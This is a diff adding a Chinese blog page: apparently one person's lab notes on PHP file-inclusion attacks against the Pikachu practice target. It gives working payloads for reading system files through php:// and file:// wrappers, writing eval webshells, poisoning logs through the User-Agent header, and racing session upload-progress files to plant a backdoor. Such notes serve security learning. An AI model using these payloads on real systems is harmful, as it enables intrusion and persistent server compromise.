@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="x5-fullscreen" content="true">
+<meta name="full-screen" content="yes">
+<meta name="theme-color" content="#317EFB" />
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=0" name="viewport">
+<meta name="description" content="文件包含查看类型先检查是只有一种还是两种都有(本地文件包含LFI &#x2F; 远程文件包含RFI) 百盒类型php环境 include(),require(),include_once(),require_once()  需要在对应的php.ini下设置,这是需要提前设置的 12allow_url_fopen:默认值是ON。允许url里的封装协议访问文件；allow_url_include:默认">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pikachu_文件包含">
+<meta property="og:url" content="https://aaaaaamua.github.io/2025/03/11/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/pikachu/include/index.html">
+<meta property="og:site_name" content="aaaaaaamua">
+<meta property="og:description" content="文件包含查看类型先检查是只有一种还是两种都有(本地文件包含LFI &#x2F; 远程文件包含RFI) 百盒类型php环境 include(),require(),include_once(),require_once()  需要在对应的php.ini下设置,这是需要提前设置的 12allow_url_fopen:默认值是ON。允许url里的封装协议访问文件；allow_url_include:默认">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://aaaaaamua.github.io/img/404.jpg">
+<meta property="article:published_time" content="2025-03-10T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-05-03T02:48:14.872Z">
+<meta property="article:author" content="aaaaaaamua">
+<meta property="article:tag" content="fileinclude">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://aaaaaamua.github.io/img/404.jpg">
+
+
+<title >pikachu_文件包含</title>
+
+<!-- Favicon -->
+
+    <link href='http://mms2.baidu.com/it/u=1764489770,1790526983&fm=253&app=138&f=JPEG?w=508&h=500?v=2.2.5' rel='icon' type='image/png' sizes='16x16' ></link>
+
+
+    <link href='http://mms0.baidu.com/it/u=4208939750,346890809&fm=253&app=138&f=JPEG?w=304&h=304?v=2.2.5' rel='icon' type='image/png' sizes='32x32' ></link>
+
+
+    <link href='http://mms0.baidu.com/it/u=4208939750,346890809&fm=253&app=138&f=JPEG?w=304&h=304?v=2.2.5' rel='apple-touch-icon' sizes='180x180' ></link>
+
+
+
+<!-- Plugin -->
+
+
+
+
+    
+<link rel="stylesheet" href="/css/plugins/bootstrap.row.css">
+
+    
+<link rel="stylesheet" href="https://unpkg.com/@fancyapps/ui@4.0/dist/fancybox.css">
+
+    
+    
+
+
+
+
+<!-- Icon -->
+
+    
+<link rel="stylesheet" href="/css/plugins/font-awesome.min.css">
+
+
+
+
+<!-- Variable -->
+<script>window.ASYNC_CONFIG = {"hostname":"aaaaaamua.github.io","author":"aaaaaaamua","root":"/","typed_text":["cow and horse"],"theme_version":"2.2.5","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":"/img/picture/touxiang.png","icon16":"http://mms2.baidu.com/it/u=1764489770,1790526983&fm=253&app=138&f=JPEG?w=508&h=500","icon32":"http://mms0.baidu.com/it/u=4208939750,346890809&fm=253&app=138&f=JPEG?w=304&h=304","apple_touch_icon":null,"webmanifest":null,"visibilitychange":false,"hidden":"https://mms2.baidu.com/it/u=251319153,2346383010&fm=253&app=120&f=JPEGw=500&h=500# /failure.ico","show_text":"(/≧▽≦/)咦！又好了！","hide_text":"(●—●)喔哟，崩溃啦！","appleTouchIcon":"http://mms0.baidu.com/it/u=4208939750,346890809&fm=253&app=138&f=JPEG?w=304&h=304"},"i18n":{"placeholder":"搜索文章...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）","author":"本文作者：","copyright_link":"本文链接：","copyright_license_title":"版权声明：","copyright_license_content":"本博客所有文章除特别声明外，均默认采用 undefined 许可协议。","copy_success":"复制成功","copy_failure":"复制失败","open_read_mode":"进入阅读模式","exit_read_mode":"退出阅读模式","notice_outdate_message":"距离上次更新已经 undefined 天了, 文章内容可能已经过时。","sticky":"置顶","just":"刚刚","min":"分钟前","hour":"小时前","day":"天前","month":"个月前"},"swup":false,"plugin":{"flickr_justified_gallery":"https://unpkg.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":false,"title":"default","height_limit":200},"toc":{"post_title":false},"live_time":{"start_time":"","prefix":"博客已萌萌哒运行 undefined 天"},"danmu":{"enable":false,"el":".trm-banner"},"search":{"enable":true,"type":"local","href":"https://www.google.com/search?q=site:","domain":null,"trigger":"auto","path":"search.json"}};</script>
+<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2025-05-03 10:48:14"};</script>
+
+<!-- Theme mode css -->
+<link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.2.5" id="trm-switch-style">
+<script>
+    let defaultMode = ASYNC_CONFIG.theme.default !=='auto' ?  ASYNC_CONFIG.theme.default : (window.matchMedia("(prefers-color-scheme: light)").matches ? 'style-light' : 'style-dark')
+    let catchMode = localStorage.getItem('theme-mode') || defaultMode;
+    let type = catchMode === 'style-dark' ? 'add' : 'remove';
+    document.documentElement.classList[type]('dark')
+</script>
+
+<!-- CDN -->
+
+
+    
+    
+
+
+
+<!-- Site Analytics -->
+
+
+    
+        <!-- Baidu Analytics -->
+        <script defer>
+            var _hmt = _hmt || [];
+            (function() {
+              var hm = document.createElement("script");
+              hm.src = "https://hm.baidu.com/hm.js?20136";
+              var s = document.getElementsByTagName("script")[0]; 
+              s.parentNode.insertBefore(hm, s);
+            })();
+        </script>
+     
+
+    
+        <!-- Google Analytics -->
+        <script async src='https://www.googletagmanager.com/gtag/js?id=G-EJ6W34RGXT'></script>
+        <script defer>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-EJ6W34RGXT');
+        </script>
+    
+
+    
+ 
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+
+  <!-- app wrapper -->
+  <div class="trm-app-frame">
+
+    <!-- page preloader -->
+    <div class="trm-preloader">
+    <div class="trm-holder">
+        <div class="preloader">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+</div>
+    <!-- page preloader end -->
+
+    <!-- change mode preloader -->
+    <div class="trm-mode-swich-animation-frame">
+    <div class="trm-mode-swich-animation">
+        <i class="i-sun"><i class="iconfont far fa-sun"></i></i>
+        <div class="trm-horizon"></div>
+        <i class="i-moon"><i class="iconfont far fa-moon"></i></i>
+    </div>
+</div>
+    <!-- change mode preloader end -->
+
+      <!-- scroll container -->
+      <div id="trm-dynamic-content" class="trm-swup-animation">
+        <div id="trm-scroll-container" class="trm-scroll-container" style="opacity: 0">
+            <!-- top bar -->
+            <header class="trm-top-bar">
+	<div class="container">
+		<div class="trm-left-side">
+			<!-- logo -->
+<a href="/" class="trm-logo-frame trm-anima-link">
+    
+        <img alt="logo" src="/img/picture/touxiang.png">
+    
+    
+</a>
+<!-- logo end -->
+		</div>
+		<div class="trm-right-side">
+			<!-- menu -->
+<div class="trm-menu">
+    <nav>
+        <ul>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/" target="">
+                    首页
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/archives/" target="">
+                    归档
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/tags" target="">
+                    标签
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/categories/" target="">
+                    分类
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a data-no-swup href="/links/" target="">
+                    友链
+                </a>
+                
+            </li>
+            
+        </ul>
+    </nav>
+</div>
+<!-- menu end -->
+			
+    <!-- mode switcher place -->
+    <div class="trm-mode-switcher-place">
+        <div class="trm-mode-switcher">
+            <i class="iconfont far fa-sun"></i>
+            <input class="tgl tgl-light" id="trm-swich" type="checkbox">
+            <label class="trm-swich" for="trm-swich"></label>
+            <i class="iconfont far fa-moon"></i>
+        </div>
+    </div>
+    <!-- mode switcher place end -->
+
+			
+    
+    <div id="trm-search-btn" class="trm-search-btn">
+        <i class="iconfont fas fa-search"></i>
+    </div>
+     
+
+		</div>
+		<div class="trm-menu-btn">
+			<span></span>
+		</div>
+	</div>
+</header>
+            <!-- top bar end -->
+
+            <!-- body -->
+            
+<div class="trm-content-start">
+    <!-- banner -->
+    <div class="trm-banner">
+    
+    <!-- banner cover -->
+    <img style="object-position:top;object-fit:cover;" alt="banner" class="trm-banner-cover" src="/img/banner.png">
+    <!-- banner cover end -->
+    
+
+    <!-- banner content -->
+    <div class="trm-banner-content trm-overlay">
+        <div class="container">
+            <div class="row">
+                
+                <div class="col-lg-4"></div>
+                
+                <div class="col-lg-8">
+
+                    <!-- banner title -->
+                    <div class="trm-banner-text ">
+                        <div class="trm-label trm-mb-20">
+                            Hi my new friend!
+                        </div>
+                        <h1 class="trm-mb-30 trm-hsmb-font">
+                            pikachu_文件包含
+                        </h1>
+
+                        
+                            <ul class="trm-breadcrumbs trm-label">
+                                <li>
+                                    <a href="/" class="trm-anima-link">Home</a>
+                                </li>
+                                <li>
+                                    <span>
+                                        2025
+                                    </span>
+                                </li>
+                            </ul>
+                        
+                    </div>
+                    <!-- banner title end -->
+
+                    <!-- scroll hint -->
+                    <span id="scroll-triger" class="trm-scroll-hint-frame">
+                        <div class="trm-scroll-hint"></div>
+                        <span class="trm-label">Scroll down</span>
+                    </span>
+                    <!-- scroll hint end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- banner content end -->
+</div>
+    <!-- banner end -->
+    <div class="container">
+        <div class="row">
+            
+                <div class="trm-page-sidebar col-lg-4 hidden-sm">
+                    <!-- main card -->
+                    <div class="trm-main-card-frame trm-sidebar">
+    <div class="trm-main-card"> 
+        <!-- card header -->
+<div class="trm-mc-header">
+    <div class="trm-avatar-frame trm-mb-20">
+        <img alt="Avatar" class="trm-avatar" src="/img/touxiang.webp">
+    </div>
+    <h5 class="trm-name trm-mb-15">
+        aaaaaaaaamua
+    </h5>
+    
+        <div class="trm-label">
+            I`m
+            <span class="trm-typed-text">
+                <!-- Words for theme.user.typedText -->
+            </span>
+        </div>
+    
+</div>
+<!-- card header end -->
+        <!-- sidebar social -->
+
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+<div class="trm-social">
+    
+        <a href="https://github.com/aaaaaaaamua" title="github" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-github"></i>
+        </a>
+    
+</div>
+
+<!-- sidebar social end -->
+        <!-- info -->
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+<ul class="trm-table trm-mb-20">
+    
+        <li>
+            <div class="trm-label">
+                site:
+            </div>
+            <div class="trm-label trm-label-light">
+                Mars
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                age:
+            </div>
+            <div class="trm-label trm-label-light">
+                18
+            </div>
+        </li>
+    
+</ul>
+<!-- info end -->
+
+        
+    </div>
+</div>
+                    <!-- main card end -->
+                </div>
+            
+            <div class="trm-page-content col-lg-8">
+                <div id="trm-content" class="trm-content">
+                    <div class="trm-post-info row hidden-sm">
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-calendar-alt trm-icon"></i><br>
+            03/11
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-clock trm-icon"></i><br>
+            00:00
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div id="post-author" class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-user trm-icon"></i><br>
+            aaaaaaamua
+        </div>
+    </div>
+</div>
+<div class="trm-card ">
+    <article id="article-container" class="trm-publication">
+    <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="查看类型"><a href="#查看类型" class="headerlink" title="查看类型"></a>查看类型</h2><p>先检查是只有一种还是两种都有(本地文件包含<code>LFI</code> &#x2F; 远程文件包含<code>RFI</code>)</p>
+<h3 id="百盒类型"><a href="#百盒类型" class="headerlink" title="百盒类型"></a>百盒类型</h3><h4 id="php环境"><a href="#php环境" class="headerlink" title="php环境"></a>php环境</h4><blockquote>
+<p><code>include()</code>,<code>require()</code>,<code>include_once()</code>,<code>require_once()</code></p>
+</blockquote>
+<p>需要在对应的<code>php.ini</code>下设置,这是需要提前设置的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen:默认值是ON。允许url里的封装协议访问文件；</span><br><span class="line">allow_url_include:默认值是OFF。不允许包含url里的封装协议包含文件；</span><br></pre></td></tr></table></figure>
+
+<p><code>include()</code>远程代码执行,实际上是在本地执行了远程的代码,返回的仍然是本地执行后的内容</p>
+<h4 id="JAVA-环境"><a href="#JAVA-环境" class="headerlink" title="JAVA 环境"></a>JAVA 环境</h4><blockquote>
+<p><code>java.io.file</code>, <code>java.io.filereader</code></p>
+</blockquote>
+<h4 id="ASP-NET环境"><a href="#ASP-NET环境" class="headerlink" title="ASP .NET环境"></a>ASP .NET环境</h4><blockquote>
+<p><code>System.IO.FileStream</code>,<code>System.IO.FileReader</code></p>
+</blockquote>
+<h3 id="黑盒发现"><a href="#黑盒发现" class="headerlink" title="黑盒发现"></a>黑盒发现</h3><blockquote>
+<p>查看路径中是否有<code>path</code>,<code>file</code>,<code>page</code>,<code>p</code>,<code>dir</code>,<code>pag</code>,<code>eng</code>,<code>achieve</code></p>
+</blockquote>
+<h2 id="是否有文件上传"><a href="#是否有文件上传" class="headerlink" title="是否有文件上传"></a>是否有文件上传</h2><p>如果有文件利用就直接利用文件</p>
+<p>如果没有文件利用</p>
+<blockquote>
+<ol>
+<li>包含日志文件利用</li>
+<li>包含session文件利用</li>
+<li>伪协议利用</li>
+</ol>
+</blockquote>
+<h3 id="无文件支持伪协议利用"><a href="#无文件支持伪协议利用" class="headerlink" title="无文件支持伪协议利用"></a>无文件支持伪协议利用</h3><blockquote>
+<p>参考文章 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/endust/p/11804767.html">php伪协议 - 看不尽的尘埃 - 博客园</a> <a href="./%E6%9C%AC%E5%9C%B0%E5%8F%82%E8%80%83/fileinclude%E5%8F%82%E8%80%83.html">php伪协议 - 看不尽的尘埃 - 博客园</a></p>
+</blockquote>
+<p>伪协议实现无文件,但是文件读取和代码</p>
+<p><img src="/./fileinclude01.png" alt="image-20250309173449835"  data-tag='post-image' onload='this.onload=null;this.style.opacity=1;' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取:"></a>文件读取:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd 需要绝对路径</span><br><span class="line">php://filter/read=convert.base64-encode/resource=1.php 相对路径,1.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h3><blockquote>
+<p>使用这个filter&#x2F;write的时候需要后端有对应的代码支持</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/write=convert.base64-encode/resource=phpinfo.php</span><br><span class="line">对应的post夹带contents=hello world</span><br></pre></td></tr></table></figure>
+<p>后端代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include($_GET[file]);</span><br><span class="line">file_put_contents($_GET[file],$_POST[content]);</span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>也需要有对应的<code>file</code>传参点</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?file=php://input </span><br><span class="line"></span><br><span class="line">POST:&lt;?php fputs(fopen(&#x27;shell2.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt;</span><br><span class="line"></span><br><span class="line">POST:&lt;?php </span><br><span class="line">file_put_contents(&#x27;shell.php&#x27;, &#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">验证代码 cmd=echo &quot;success&quot;; 一定要加上回车!!!!!!</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://input</span><br><span class="line">POST: &lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;base64,’base64加密后的内容‘</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="日志文件包含-如果php被过滤了且无法绕过"><a href="#日志文件包含-如果php被过滤了且无法绕过" class="headerlink" title="日志文件包含 如果php被过滤了且无法绕过"></a>日志文件包含 如果<code>php</code>被过滤了且无法绕过</h3><blockquote>
+<p>使用包含日志文件利用, 原理是修改<code>UA头</code>改成执行代码,访问日志路径时会被执行</p>
+</blockquote>
+<p>寻找框架,找出默认日志地址</p>
+<ul>
+<li><p><code>nginx</code>默认访问路径地址 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>apaceh</code>的日志在类似目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/log/httpd/access.log</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><code>User-Agent</code>改成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: aaaaaaaa&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br><span class="line">User-Agent: aaaaaaaa&lt;?php system(&#x27;cat fl0g.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后再访问<code>access.log</code>就可以得到执行的命令回显</p>
+<h3 id="SESSION文件包含"><a href="#SESSION文件包含" class="headerlink" title="SESSION文件包含"></a><code>SESSION</code>文件包含</h3><blockquote>
+<p>参考文档 </p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lnterpreter/p/14086164.html">session包含 - lnterpreter - 博客园</a> <a href="file://./本地参考/fileinclude参考2session.html">session包含本地备份</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/echoDetected/p/13976405.html">Ctfshow Web入门 - 文件包含总结 - ch0bits - 博客园 </a> <a href="file://./本地参考/fileinclude参考3.html">本地备份</a></p>
+</blockquote>
+<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session.save_path       //session文件存储地址</span><br><span class="line">session.upload_progress.enabled      //session文件上传上传</span><br><span class="line">session.upload_progress.cleanup     //定时清空文件</span><br></pre></td></tr></table></figure>
+
+<p>信息搜集找到对应框架，发现默认<code>session</code>储存地址</p>
+<ul>
+<li><p><code>phpstudy</code>默认地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\AppGallery\phpstudy_pro\Extensions\tmp\tmp</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>Windows</code>服务器地址</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\\WINDOWS\Temp</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>Linux</code>服务器 linux服务器不分大小写D:\AppGallery\phpstudy_pro\Extensions\tmp\tmp&#96;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/session 或者 /var/lib/php/session</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在发包中的文件头中嵌入<code>cookie</code>设置<code>senssion</code>可以在本地的<code>session</code>路径下生成session名文件,但是由于<code>session.upload_progress.cleanup</code>的存在,上传的session马上会被删除,但是有确实短暂的在服务器中存在一段时间</p>
+<p>故使用条件竞争,想达到上传session之后在被服务器清除之前访问session的文件来执行里面的代码</p>
+<p>需要在访问包头中添加Cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: PHPSESSID=xiaodi  !!!!注意PHPSESSID书写</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong>PHP_SESSION_UPLOAD_PROGRESS 的作用</strong><br>当表单中包含 PHP_SESSION_UPLOAD_PROGRESS 字段且 PHP 配置 session.upload_progress.enabled &#x3D; On 时，PHP 会在文件上传过程中将进度信息写入 Session 文件（默认路径如 <code>/tmp/sess_&lt;PHPSESSID&gt;</code>）。</p>
+</li>
+<li><p><strong>Session 文件包含漏洞</strong><br>若服务器存在文件包含漏洞（如 <code>include($_GET[&#39;file&#39;]);</code>）且能包含 Session 文件（如 <code>/tmp/sess_123</code>），攻击者可通过构造恶意 Session 文件内容，使其被解析为 PHP 代码。</p>
+</li>
+<li><p><strong>利用链</strong></p>
+</li>
+</ul>
+<p>​	通过上传表单注入 PHP 代码到 Session 文件。<br>​	通过文件包含漏洞触发 Session 文件中的恶意代码。<br>​	恶意代码生成 Webshell（shell.php）。</p>
+<h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><ul>
+<li><p><strong>恶意表单</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://school-server.us.kg:35565/pikachu/1.php&quot; method=&quot;POST&quot;     enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;? php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;);?&gt;&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>触发 Session 文件写入</strong><br>提交表单上传文件时，PHP 会生成 Session 文件，内容类似：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload_progress_&lt;?php fputs(...); ?&gt;|a:5:&#123;s:10:&quot;start_time&quot;;i:1620000000;...&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此处 upload_progress_ 是 PHP 自动添加的前缀，后面紧跟恶意代码。</p>
+</li>
+<li><p><strong>利用文件包含漏洞</strong><br>假设服务器存在文件包含漏洞（如 <code>include($_GET[&#39;file&#39;]);</code>），攻击者请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target.com/include.php?file=/tmp/sess_123</span><br></pre></td></tr></table></figure>
+
+<p>当包含 Session 文件时，PHP 会解析文件内容中的 <code>&lt;?php ... ?&gt;</code> 代码。<br>恶意代码 <code>fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;)</code> 被执行，生成 Webshell。</p>
+</li>
+<li><p>实施</p>
+<p>使用<code>burpsuite</code>的<code>intruder</code>功能,一个上传包含恶意表单的去建立session内容,一个访问session的路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/session/sess_xiaozhao</span><br></pre></td></tr></table></figure>
+
+<p>只要有一次在被清除前访问了这个session就可以执行里面的恶意代码,建立后门文件</p>
+</li>
+</ul>
+
+</article>
+    
+    
+
+</div>
+<div class="trm-post-next-prev row">
+    <div class="col-lg-12">
+        <!-- title -->
+        <h5 class="trm-title-with-divider">
+            其他文章
+            <span data-number="02"></span>
+        </h5>
+    </div>
+    
+        <div class="col-lg-6">
+    <div class="trm-older-publications-card trm-scroll-animation trm-active-el">
+        <div class="trm-older-publication">
+            
+            <a class="trm-op-top trm-anima-link" href="/2025/03/13/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/pikachu/ssrf/">
+                <span class="trm-op-cover">
+                    <img alt="cover" class="no-fancybox" src="/img/block.jpg">
+                </span>
+                <h6 class="trm-op-title">pikachu_ssrf</h6>
+            </a>
+            <div class="trm-divider trm-mb-15 trm-mt-20"></div>
+            <ul class="trm-card-data trm-label">
+                <li>25/03/13</li>
+                <li>00:00</li>
+                <li>打靶日记</li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+    
+        <div class="col-lg-6">
+    <div class="trm-older-publications-card trm-scroll-animation trm-active-el">
+        <div class="trm-older-publication">
+            
+            <a class="trm-op-top trm-anima-link" href="/2025/03/09/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/pikachu/rce/">
+                <span class="trm-op-cover">
+                    <img alt="cover" class="no-fancybox" src="/img/block.jpg">
+                </span>
+                <h6 class="trm-op-title">pikachu_rce</h6>
+            </a>
+            <div class="trm-divider trm-mb-15 trm-mt-20"></div>
+            <ul class="trm-card-data trm-label">
+                <li>25/03/09</li>
+                <li>00:00</li>
+                <li>打靶日记</li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+</div>
+
+    
+
+
+
+                    <div class="trm-divider footer-divider"></div>
+
+                    <!-- footer -->
+                    <footer class="trm-footer-card trm-scroll-animation">
+
+    
+
+    
+        <div class="trm-footer-item">
+            <span>© 2024 - 2025</span>
+            <span class="footer-separator"data-separator=" · "></span>
+            <span class="trm-accent-color">aaaaaaaaamua</span>
+        </div>
+    
+
+      
+
+     
+
+    
+        <div class="trm-footer-item">
+            大佬来了就随便看看吧
+        </div>
+     
+
+
+    
+</footer>
+                    <!-- footer end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+            <!-- body end -->
+
+            
+
+    <div id="post-toc" class="trm-post-toc">
+      <div class="trm-post-toc-header">
+        目录导航
+				<span id="post-toc-top">
+					置顶
+				</span>
+      </div>
+      <div class="trm-post-toc-content">
+        <ol class="trm-toc"><li class="trm-toc-item trm-toc-level-1" title="文件包含"><a rel="nofollow" class="trm-toc-link" href="#文件包含"><span class="trm-toc-number">1.</span> <span class="trm-toc-text">文件包含</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-2" title="查看类型"><a rel="nofollow" class="trm-toc-link" href="#查看类型"><span class="trm-toc-number">1.1.</span> <span class="trm-toc-text">查看类型</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-3" title="百盒类型"><a rel="nofollow" class="trm-toc-link" href="#百盒类型"><span class="trm-toc-number">1.1.1.</span> <span class="trm-toc-text">百盒类型</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-4" title="php环境"><a rel="nofollow" class="trm-toc-link" href="#php环境"><span class="trm-toc-number">1.1.1.1.</span> <span class="trm-toc-text">php环境</span></a></li><li class="trm-toc-item trm-toc-level-4" title="JAVA 环境"><a rel="nofollow" class="trm-toc-link" href="#JAVA-环境"><span class="trm-toc-number">1.1.1.2.</span> <span 